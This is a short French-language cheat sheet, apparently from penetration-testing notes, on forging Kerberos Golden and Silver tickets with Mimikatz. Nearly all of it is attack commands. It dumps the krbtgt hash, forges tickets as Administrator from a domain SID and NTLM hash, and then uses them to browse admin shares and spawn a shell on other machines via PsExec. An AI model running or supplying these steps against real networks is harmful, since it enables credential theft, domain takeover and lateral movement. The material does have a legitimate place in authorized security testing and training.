# Silver & Golden Tickets 

[Mimikatz](Mimikatz.md)

- Un ticket argent (silver) est limité au service ciblé.
- Un ticket or (golden) a accès à n'importe quel service Kerberos.

## Golden Tickets

Vider le hachage krbtgt

```sh
lsadump::lsa /inject /name:krbtgt
# Assurez-vous que cela génère: [privilège '20' ok]
```

Créer un ticket d'or

```sh
kerberos::golden /user:Administrator /domain:controller.local /sid:{krbtgt_SID} /krbtgt:{krbtgt_NTHASH} /id:500

kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{SID} /krbtgt:{NTLM} /id:500

# Assurez-vous que cela génère: Final Ticket Saved to file !
```

Utilisez le ticket Golden pour accéder à d'autres machines

```sh
misc::cmd
# Cela ouvrira une nouvelle invite de commande avec des privilèges élevés sur toutes les machines


dir \\DESKTOP-1\c$
PsExec.exe \\DESKTOP-1 cmd.exe
```


## Silver Tickets

Pour créer un ticket d'argent, placez simplement un hachage NTLM de service dans l'emplacement krbtgt, le SID du compte de service dans SID et modifiez l'ID en 1103.

Créer un ticket d'or/d'argent

```sh
kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:1103
```

Utilisez le ticket Silver pour accéder au service

```sh
misc::cmd
# Cela ouvrira une nouvelle invite de commande élevée avec le ticket donné dans mimikatz

dir \\DESKTOP-1\c$
```